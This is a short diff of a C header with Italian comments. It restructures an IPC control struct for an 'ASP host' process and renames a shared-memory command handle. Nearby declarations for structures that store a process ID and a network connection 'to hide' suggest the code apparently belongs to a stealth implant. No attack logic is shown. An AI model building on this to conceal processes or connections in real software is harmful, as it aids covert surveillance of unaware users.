@@ -136,8 +136,10 @@ typedef struct {
 #define ASP_ERROR 3 // ASP host ha finito con un errore
 
 typedef struct {
-	DWORD action;    // Azione da eseguire 
-	DWORD status;    // stato dell'operazione (va settato per ultimo)
+	struct {
+		WORD action; // Azione da eseguire 
+		WORD status; // stato dell'operazione (va settato per ultimo)
+	} ctrl;
 	DWORD out_command; // valore di ritorno del comando sul server
 	BYTE in_param[MAX_ASP_IN_PARAM];
 	DWORD in_param_len;
@@ -147,7 +149,7 @@ typedef struct {
 
 extern HANDLE ASP_HostProcess; // Processo che gestisce ASP
 extern ASP_IPC_CTRL* ASP_IPC_command;  // Area di shared memory per dare comandi al processo ASP
-extern HANDLE hASPIPCcommandfile;                  // File handle della shared memory dei comandi
+extern HANDLE hASP_CmdFile;                  // File handle della shared memory dei comandi
 extern CONNECTION_HIDE connection_hide; // struttura per memorizzare il pid da nascondere
 extern PID_HIDE pid_hide; // struttura per memorizzare la connessione da nascondere
 extern HINTERNET asp_global_request;
